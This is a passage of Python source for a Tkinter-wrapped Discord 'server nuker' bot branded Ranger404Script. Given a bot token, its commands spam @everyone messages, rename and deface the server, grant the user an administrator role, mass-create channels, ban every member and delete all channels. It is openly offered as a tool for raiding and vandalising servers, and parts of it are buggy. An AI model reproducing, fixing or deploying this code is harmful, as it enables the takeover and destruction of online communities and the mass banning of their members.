
win.configure(bg="black")
win.resizable(0,0)
win.title("Server Nucker Discord | Ranger404Script")
#Token Bot
token_lable = tk.Label(win,text="Token >",fg="yellow",bg="black",font=("Dosis",12))
token_lable.pack()
token = tk.Entry(win,width=60,fg="blue",font=("Montserrat",11))
token.pack()

#Status Bot
status_lable = tk.Label(win,text="Status >",fg="yellow",bg="black",font=("Dosis",12))
status_lable.pack()
status = tk.Entry(win,width=60,fg="blue",font=("Montserrat",11))
status.pack()

#Perfix Bot 
perfix_lable = tk.Label(win,text="Perfix >",fg="yellow",bg="black",font=("Dosis",12))
perfix_lable.pack()
perfix = tk.Entry(win,width=60,fg="blue",font=("Montserrat",11))
perfix.pack()

#Message Spam
message_lable = tk.Label(win,text="Message >",fg="yellow",bg="black",font=("Dosis",12))
message_lable.pack()
message = tk.Entry(win,width=60,fg="blue",font=("Montserrat",11))
message.pack()

#Name
name_lable = tk.Label(win,text="Name >",fg="yellow",bg="black",font=("Dosis",12))
name_lable.pack()
name = tk.Entry(win,width=60,fg="blue",font=("Montserrat",11))
name.pack()
#Bot Codes
def bot_start():
    text.configure(text="Bot Is Run & Status Set.")
    #get token , status , perfix , message

    token_bot = token.get()
    status_bot = status.get() + " | " + "Ranger 404 Script"
    perfix_bot = perfix.get()
    message_bot = message.get() + " | " + "Ranger 404 Script" + " | " + "@everyone @here"
    name_bot = name.get()

    #confing bot

    intents = discord.Intents.all()
    bot = commands.Bot(command_prefix=perfix_bot,intents=intents)

    #bot event

    @bot.event
    async def on_ready():
        await bot.change_presence(activity=discord.Streaming(name=status_bot, url='https://twitch.tv/ranger404script'))
        text.configure(text="Bot Is Run & Status Set.")
    
    #commands

    @bot.command()
    async def spam(ctx):
        count = 0
        for i in range(50):
            count +=1
            await ctx.send(message_bot)
            text.configure(text=f"{count} Message Send .")

    @bot.command()
    async def server(ctx):
        guild = ctx.message.guild
        with open('.\\app\\server.png', 'rb') as f:
            icon = f.read()
        name = f"Server Fuck By {name_bot} & Ranger404 Script"
        await ctx.guild.edit(name=name)
        await ctx.guild.edit(icon=icon)

    @bot.command()
    async def power(ctx):
        guild = ctx.message.guild
        user = ctx.message.author
        await guild.create_role(name=name_bot, colour = discord.Colour.blue(), permissions=permissions)
        role = discord.utils.get(ctx.guild.roles, name=name_bot)
        permissions = discord.Permissions()
        permissions.update(administrator = True)
        await user.add_roles(role)

    @bot.command()
    async def create(ctx):
        name = name_bot
        guild = ctx.message.guild
        count = 0
        for i in range(50):
            count +=1
            text.configure(text=f"{count} Channel Create .")
            await guild.create_text_channel(name)

    @bot.command()
    async def ban(ctx):
        count = 0
        for member in list(ctx.guild.members):
            try:
                count +=1
                await member.ban(reason=f'Server Hackid By {name_bot} & Ranger404Script')
                text.configure(text=f"{count} Ban .")
            except:
                pass

    @bot.command()
    async def nuck(ctx):
        guild = ctx.guild
        for channel in guild.channel:
            await channel.delete()


    #run bot

    bot.run(token_bot)


#Start Bot
start = tk.Button(win,text="Run",font=("Dosis",12),fg="red",bg="black",height=3,width=60,command=lambda:bot_start())
start.pack()

#Text Info
texti = tk.Label(text="Click Run For Run Bot\n Wait 5 Sec & Send Commands",fg="yellow",bg="black",font=("Montserrat",12))
texti.pack()

#Text
text = tk.Label(text="",fg="yellow",bg="black",font=("Montserrat",15))
text.pack()

#Run
win.mainloop()
__name__ = "ranger404script"
